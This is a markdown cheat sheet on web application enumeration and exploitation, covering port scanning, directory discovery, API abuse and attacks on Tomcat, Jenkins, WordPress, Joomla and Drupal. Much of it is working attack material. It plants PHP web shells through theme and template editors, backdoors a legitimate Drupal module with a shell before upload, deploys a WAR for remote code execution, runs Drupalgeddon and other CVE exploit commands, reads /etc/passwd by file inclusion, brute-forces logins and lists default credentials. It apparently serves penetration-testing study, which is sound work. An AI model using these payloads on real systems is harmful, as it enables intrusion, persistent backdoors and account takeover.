# Web Application Enumeration Guide

## Table of Contents
1. [Overview](#overview)
2. [Initial Discovery](#initial-discovery)
   - [Port Scanning](#port-scanning)
   - [Technology Fingerprinting](#technology-fingerprinting)
3. [Manual Enumeration](#manual-enumeration)
   - [Browser Developer Tools](#browser-developer-tools)
   - [HTTP Headers Analysis](#http-headers-analysis)
   - [Directory & File Discovery](#directory--file-discovery)
   - [Sitemap & Robots.txt](#sitemap--robotstxt)
4. [API Discovery & Testing](#api-discovery--testing)
   - [Endpoint Discovery](#endpoint-discovery)
   - [Authentication Testing](#authentication-testing)
   - [Exploitation Techniques](#exploitation-techniques)
5. [Automated Discovery](#automated-discovery)
   - [EyeWitness](#eyewitness)
   - [Aquatone](#aquatone)
6. [Common Applications](#common-applications)
   - [High-Value Targets](#high-value-targets)
   - [Network Appliances](#network-appliances)
7. [CMS Enumeration](#cms-enumeration)
   - [WordPress](#wordpress)
   - [Joomla](#joomla)
   - [Drupal](#drupal)
8. [Quick Reference](#quick-reference)

---

## Overview

**Objective**: Identify technology stack and attack surface
**Focus**: Web servers, APIs, CMS platforms, admin interfaces

### Technology Stack
- **OS**: Windows, Linux, Unix
- **Web Server**: Apache, Nginx, IIS, Tomcat
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle
- **Language**: PHP, ASP.NET, Java, Python, Node.js

---

## Initial Discovery

### Port Scanning
```bash
# Common web ports
nmap -p 80,443,8000,8080,8180,8888,10000 --open -sV target

# Extended scan
nmap -p 80-90,443,8000-8090,9000-9090,10000-10090 --open target

# Full TCP scan
nmap --open -sV -p- target
```

### Technology Fingerprinting
```bash
# Whatweb
whatweb http://target.com

# Manual headers
curl -I http://target.com | grep -E "(Server|X-Powered-By|X-AspNet-Version)"

# Wappalyzer CLI
wappalyzer http://target.com
```

---

## Manual Enumeration

### Browser Developer Tools
```
Firefox: F12 > Debugger/Network/Inspector
- JavaScript frameworks identification
- Hidden form fields
- API endpoints in JS
- Client-side validation bypass
- Debug parameters
```

### HTTP Headers Analysis
```bash
# Header inspection
curl -I http://target.com
curl -i -X OPTIONS http://target.com

# Key headers:
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3
# X-AspNet-Version: 4.0.30319
# X-Amz-Cf-Id: [CloudFront]
```

### Directory & File Discovery
```bash
# Basic enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Technology-specific extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,asp,aspx,jsp,html,txt

# Configuration files
curl http://target.com/web.config
curl http://target.com/.env
curl http://target.com/wp-config.php
```

### Sitemap & Robots.txt
```bash
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey"
```

---

## API Discovery & Testing

### Endpoint Discovery
```bash
# Pattern-based discovery
cat > api_patterns.txt << EOF
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/api
{GOBUSTER}/rest
EOF

gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -p api_patterns.txt

# Common endpoints
/api/, /api/v1/, /api/v2/, /rest/, /graphql, /swagger/, /docs/
```

### Authentication Testing
```bash
# HTTP method testing
curl -X GET/POST/PUT/DELETE/PATCH/OPTIONS http://target.com/api/v1/users

# Registration abuse
curl -d '{"username":"admin","password":"pass","admin":"True"}' \
  -H 'Content-Type: application/json' http://target.com/api/v1/register

# JWT token abuse
curl -X PUT -H 'Authorization: Bearer TOKEN' \
  -d '{"password":"pwned"}' http://target.com/api/v1/admin/password
```

### Exploitation Techniques
```bash
# Parameter pollution
curl "http://target.com/api/v1/users?id=1&id=2"

# Mass assignment
curl -d '{"username":"test","role":"admin","permissions":["all"]}' \
  -H 'Content-Type: application/json' http://target.com/api/v1/users

# IDOR testing
curl -H 'Authorization: Bearer TOKEN' http://target.com/api/v1/users/1/profile
```

---

## Automated Discovery

### EyeWitness
```bash
# Installation & usage
sudo apt install eyewitness
eyewitness --web -x nmap_scan.xml -d screenshots
eyewitness --web -f urls.txt --threads 10 -d results
```

### Aquatone
```bash
# Download & setup
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip

# Usage
cat nmap_scan.xml | ./aquatone -nmap
cat hosts.txt | ./aquatone -ports 80,443,8080,8443,9000
```

---

## Common Applications

### High-Value Targets

#### Apache Tomcat
```bash
# Manager interfaces
curl http://target.com:8080/manager/html
curl http://target.com:8080/host-manager/html

# Default credentials
curl -u 'tomcat:tomcat' http://target.com:8080/manager/html
curl -u 'admin:admin' http://target.com:8080/manager/html

# WAR upload for RCE
curl -u 'tomcat:pass' --upload-file shell.war \
  'http://target.com:8080/manager/text/deploy?path=/shell'
```

#### Jenkins
```bash
# Common paths
/jenkins/, /ci/, /build/

# Script console (if accessible)
curl http://target.com:8080/jenkins/script
# Execute: "whoami".execute().text
```

#### Git Repositories
```bash
curl http://target.com/.git/config
curl http://target.com/.git/HEAD
git-dumper http://target.com/.git/ output_directory
```

### Network Appliances
```bash
# PRTG Network Monitor
curl -d "username=prtgadmin&password=prtgadmin" \
  http://target.com:8080/public/checklogin.htm

# Splunk
curl http://target.com:8000/en-GB/account/login
# Default: admin:changeme
```

---

## CMS Enumeration

## WordPress

### Discovery
```bash
# Identification
curl http://target.com/robots.txt  # Look for /wp-admin/, /wp-content/
curl -s http://target.com | grep -i "generator.*wordpress"
curl -s http://target.com/?feed=rss2 | grep -i generator
```

### Manual Enumeration
```bash
# Theme discovery
curl -s http://target.com | grep -oP 'themes/[^/]+' | sort -u

# Plugin enumeration
curl -s http://target.com | grep -oP 'plugins/[^/]+' | sort -u

# User enumeration
curl http://target.com/wp-json/wp/v2/users
curl http://target.com/?author=1

# Configuration files
curl http://target.com/wp-config.php.bak
curl http://target.com/readme.html
```

### WPScan
```bash
# Installation
sudo gem install wpscan

# Basic enumeration
wpscan --url http://target.com --enumerate u,p,t --api-token TOKEN

# Password attacks (XML-RPC preferred)
wpscan --url http://target.com --password-attack xmlrpc -U users.txt -P passwords.txt
```

### Exploitation
```php
// Theme editor RCE (admin access required)
// Navigate: Appearance > Theme Editor > 404.php
<?php system($_GET['cmd']); ?>
// Access: /wp-content/themes/theme-name/404.php?cmd=id
```

### Common Vulnerabilities
```bash
# mail-masta LFI
curl "http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# wpDiscuz RCE (CVE-2020-24186)
python3 wp_discuz.py -u http://target.com -p "/?p=1"

# XML-RPC detection
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://target.com/xmlrpc.php
```

---

## Joomla

### Discovery
```bash
# Identification
curl -s http://target.com | grep -i "joomla"
curl http://target.com/robots.txt  # Look for /administrator/

# Version detection
curl -s http://target.com/README.txt | head -n 5
curl -s http://target.com/administrator/manifests/files/joomla.xml | xmllint --format -
```

### Automated Tools
```bash
# Droopescan
sudo pip3 install droopescan
droopescan scan joomla --url http://target.com

# JoomlaScan (Python 2.7)
python2.7 joomlascan.py -u http://target.com
```

### Authentication
```bash
# Admin portal
curl http://target.com/administrator/

# Brute force
python3 joomla-brute.py -u http://target.com -w passwords.txt -usr admin
# Common: admin:admin, admin:password, admin:joomla
```

### Exploitation
```php
// Template modification (admin access)
// Navigate: Extensions > Templates > Templates (Site) > Protostar > error.php
<?php system($_GET['cmd']); ?>
// Access: /templates/protostar/error.php?cmd=id
```

### Known Vulnerabilities
```bash
# Directory traversal (CVE-2019-10945)
python2.7 joomla_dir_trav.py --url "http://target.com/administrator/" \
  --username admin --password admin --dir /
```

---

## Drupal

### Discovery
```bash
# Identification
curl -s http://target.com | grep -i "drupal"
curl http://target.com/node/1  # Node-based structure
curl http://target.com/user/login

# Version detection
curl -s http://target.com/CHANGELOG.txt | grep -m2 ""
curl http://target.com/core/misc/drupal.js
```

### Automated Tools
```bash
# Droopescan (recommended)
droopescan scan drupal -u http://target.com -e m,t -t 32
```

### Manual Enumeration
```bash
# Module discovery
curl http://target.com/sites/all/modules/
curl http://target.com/modules/php/LICENSE.txt

# Configuration discovery
curl http://target.com/sites/default/settings.php
curl http://target.com/sites/default/files/
```

### Exploitation

#### PHP Filter (Drupal 7)
```php
// Enable PHP Filter module > Create content > Set format to "PHP code"
<?php system($_GET['cmd']); ?>
// Access: /node/NODE_ID?cmd=id
```

#### Module Upload Backdoor
```bash
# Download legitimate module
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Add webshell and .htaccess
echo '<?php system($_GET["cmd"]); ?>' > captcha/shell.php
echo 'RewriteEngine On' > captcha/.htaccess

# Repackage and upload
tar czf captcha.tar.gz captcha/
# Upload via: admin/modules/install
```

### Drupalgeddon Vulnerabilities
```bash
# Drupalgeddon (CVE-2014-3704) - Drupal 7.0-7.31
python2.7 drupalgeddon.py -t http://target.com -u admin -p pwned

# Drupalgeddon2 (CVE-2018-7600) - Drupal < 7.58, < 8.5.1
python3 drupalgeddon2.py  # Modify for PHP shell upload

# Drupalgeddon3 (CVE-2018-7602) - Authenticated RCE
use exploit/multi/http/drupal_drupageddon3
set DRUPAL_SESSION SESS[cookie]
```

---

## Quick Reference

### Essential Commands
```bash
# Initial discovery
nmap -p 80,443,8000,8080,8180,8888,10000 --open -sV target

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# API discovery
gobuster dir -u http://target.com/api -w api_wordlist.txt

# Screenshot generation
eyewitness --web -f urls.txt -d screenshots

# Technology fingerprinting
whatweb http://target.com
```

### Default Credentials
```
Application     Username     Password
Tomcat          tomcat       tomcat
Jenkins         admin        password
Splunk          admin        changeme
PRTG            prtgadmin    prtgadmin
WordPress       admin        admin
Joomla          admin        admin
Drupal          admin        admin
```

### File Extensions
```
.php        - PHP
.asp/.aspx  - ASP.NET
.jsp        - Java Server Pages
.do         - Java Struts
.py         - Python
.rb         - Ruby
.js         - JavaScript/Node.js
```

### Common Paths
```bash
# Admin interfaces
/admin/, /administrator/, /wp-admin/

# Configuration files
/web.config, /.env, /wp-config.php, /configuration.php

# Git repositories
/.git/config, /.git/HEAD

# API endpoints
/api/, /api/v1/, /rest/, /graphql

# CMS files
/robots.txt, /sitemap.xml, /readme.txt, /CHANGELOG.txt
```